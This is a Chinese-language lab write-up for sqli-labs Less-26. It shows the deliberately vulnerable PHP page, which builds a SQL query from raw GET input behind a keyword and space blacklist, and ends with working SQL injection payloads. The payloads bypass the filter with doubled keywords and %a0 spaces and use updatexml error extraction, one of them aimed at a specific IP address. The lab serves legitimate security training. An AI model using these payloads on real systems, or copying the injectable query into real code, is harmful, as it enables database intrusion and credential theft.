@@ -1,0 +1,102 @@
+观察代码：
+ <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Less-26 Trick with comments</title>
+</head>
+
+<body bgcolor="#000000">
+<div style=" margin-top:70px;color:#FFF; font-size:40px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
+<font size="3" color="#FFFF00">
+
+
+<?php
+//including the Mysql connect parameters.
+include("../sql-connections/sql-connect.php");
+
+// take the variables 
+if(isset($_GET['id'])) /*判断GET请求变量ID是否存在*/
+{
+	$id=$_GET['id'];
+	//logging the connection parameters to a file for analysis.
+	$fp=fopen('result.txt','a');
+	fwrite($fp,'ID:'.$id."\n"); /*写入日志*/
+	fclose($fp);
+
+	//fiddling with comments
+	$id= blacklist($id); /*黑名单替换，返回的id*/
+	//echo "<br>";
+	//echo $id;
+	//echo "<br>";
+	$hint=$id;
+
+// connectivity 
+	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+	$result=mysql_query($sql);
+	$row = mysql_fetch_array($result);
+	if($row)
+	{
+	  	echo "<font size='5' color= '#99FF00'>";	
+	  	echo 'Your Login name:'. $row['username'];
+	  	echo "<br>";
+	  	echo 'Your Password:' .$row['password'];
+	  	echo "</font>";
+  	}
+	else 
+	{
+		echo '<font color= "#FFFF00">';
+		print_r(mysql_error());
+		echo "</font>";  
+	}
+}
+	else { echo "Please input the ID as parameter with numeric value";}
+
+
+
+
+function blacklist($id)
+{
+	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+	$id= preg_replace('/[--]/',"", $id);		//Strip out --
+	$id= preg_replace('/[#]/',"", $id);			//Strip out #
+	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
+	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
+	return $id;
+}
+
+
+
+?>
+</font> </div></br></br></br><center>
+<img src="../images/Less-26.jpg" />
+</br>
+</br>
+</br>
+<img src="../images/Less-26-1.jpg" />
+</br>
+</br>
+<font size='4' color= "#33FFFF">
+<?php
+echo "Hint: Your Input is Filtered with following result: ".$hint;
+?>
+</font> 
+</center>
+</body>
+</html>
+
+
+
+
+
+ 
+发现过滤了：and,or,#,/,/*,--,/s等 /s就是空格
+由于环境不同，windows上搭的sqli-labs有可能无法使用对应的url编码代替空格，而由于使用preg_replace单项删除，双写被过滤的，然后在手动闭合
+得到payload：
+ '%a0anandd%a01=1%a0anandd%a0'1'='1
+  '%a0anandd%a0updatexml(1,concat(0x7e,(select%a0user()),0x7e),1)%a0anandd%a0'1'='1
+  http://35.201.152.114:8000/Less-26/?id=1%27%a0anandd%a0updatexml(1,concat(0x7e,(select%a0user()),0x7e),1)%a0anandd%a0%271%27=%271
+  
+  information那些记得有过滤词也要双写因为informationl里面有个or，or要双写
